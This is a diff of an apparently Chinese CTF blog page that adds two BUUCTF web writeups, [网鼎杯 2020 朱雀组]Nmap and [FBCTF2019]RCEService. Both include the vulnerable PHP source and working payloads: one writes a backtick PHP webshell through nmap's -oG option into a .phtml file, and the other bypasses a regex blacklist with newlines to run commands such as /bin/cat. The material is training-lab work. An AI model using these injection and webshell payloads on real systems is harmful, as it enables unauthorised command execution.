@@ -414,13 +414,13 @@
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：1.6k字</p>
+      <p>字数：2.2k字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
-      <p>时长：8分钟</p>
+      <p>时长：11分钟</p>
     </a>
   </div>
 
@@ -546,12 +546,43 @@
 <p>exp:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;id&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a =<span class="keyword">new</span> Test;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
 
-
-
-
-
 <p>参考：</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11588219.html">https://www.cnblogs.com/20175211lyz/p/11588219.html</a></p>
+<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><h3 id="writeup-4"><a href="#writeup-4" class="headerlink" title="writeup"></a>writeup</h3><p>和这个类似：<a href="https://www.moonback.xyz/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/">https://www.moonback.xyz/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/</a></p>
+<p>不过这里过滤了 php 短标签 加上phtml绕过  payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; &lt;?&#x3D;&#96;$_POST[1]&#96;?&gt; -oG hack.phtml &#39;</span><br></pre></td></tr></table></figure>
+
+<p>关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;settings.php&#x27;</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;host&#x27;</span>])):</span><br><span class="line">	<span class="keyword">if</span> (!defined(<span class="string">&#x27;WEB_SCANS&#x27;</span>)) &#123;</span><br><span class="line">        	<span class="keyword">die</span>(<span class="string">&#x27;Web scans disabled&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$host = $_POST[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(stripos($host,<span class="string">&#x27;php&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$host = escapeshellarg($host);</span><br><span class="line">	$host = escapeshellcmd($host);</span><br><span class="line"></span><br><span class="line">	$filename = substr(md5(time() . rand(<span class="number">1</span>, <span class="number">10</span>)), <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">	$command = <span class="string">&quot;nmap &quot;</span>. NMAP_ARGS . <span class="string">&quot; -oX &quot;</span> . RESULTS_PATH . $filename . <span class="string">&quot; &quot;</span> . $host;</span><br><span class="line">	$result_scan = shell_exec($command);</span><br><span class="line">	<span class="keyword">if</span> (is_null($result_scan)) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: result.php?f=&#x27;</span> . $filename);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>nmap的输出文件选项：</p>
+<ul>
+<li>-oN 标准保存</li>
+<li>-oX XML保存</li>
+<li>-oG Grep保存</li>
+<li>-oA 保存到所有格式</li>
+<li>-append-output 补充保存文件</li>
+</ul>
+<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><h3 id="writeup-5"><a href="#writeup-5" class="headerlink" title="writeup"></a>writeup</h3><p>测了半天啥都没测出来 搜了下wp 源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>过滤的东西真多 看下正则开头任意字符 可有可无且不包括换行 结尾任意字符 同样可有可无且不包括换行 中间的字符太多了 包括换行</p>
+<p>这样匹配 group为点</p>
+<p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/image-20210221231538245.png" alt="image-20210221231538245"></p>
+<p>中间加个换行 还匹配 只不过group变成了换行</p>
+<p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/image-20210221231610549.png" alt="image-20210221231610549"></p>
+<p>再加一个换行就不匹配了</p>
+<p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/image-20210221231700970.png" alt="image-20210221231700970"></p>
+<p>列文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;&#123;%0a&quot;cmd&quot;:&quot;ls&quot;%0a&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看文件发现不行 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;&#123;%0a&quot;cmd&quot;:&quot;cat index.php&quot;%0a&#125;</span><br></pre></td></tr></table></figure>
+
+<p>猜测有可能是<code>putenv(&#39;PATH=/home/rceservice/jail&#39;)</code>的原因</p>
+<p>使用<code>/bin/cat </code>可以 查看flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;&#123;%0a&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0a&#125;</span><br></pre></td></tr></table></figure>
+
 
           
             <div class='article_footer'>
@@ -608,10 +639,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-24T23:51:03+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-21T23:23:42+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2020年10月24日</p>
+    <p>更新于：2021年2月21日</p>
   </a>
 </div>
 
@@ -759,7 +790,7 @@
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-text">[RoarCTF 2019]Easy Calc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-text">[护网杯 2018]easy_tornado</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-1"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math"><span class="toc-text">[CISCN 2019 初赛]Love Math</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-2"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-3"><span class="toc-text">writeup</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-text">[RoarCTF 2019]Easy Calc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-text">[护网杯 2018]easy_tornado</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-1"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math"><span class="toc-text">[CISCN 2019 初赛]Love Math</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-2"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-3"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="toc-text">[网鼎杯 2020 朱雀组]Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-4"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FBCTF2019-RCEService"><span class="toc-text">[FBCTF2019]RCEService</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-5"><span class="toc-text">writeup</span></a></li></ol></li></ol>
     </div>
   </section>
 
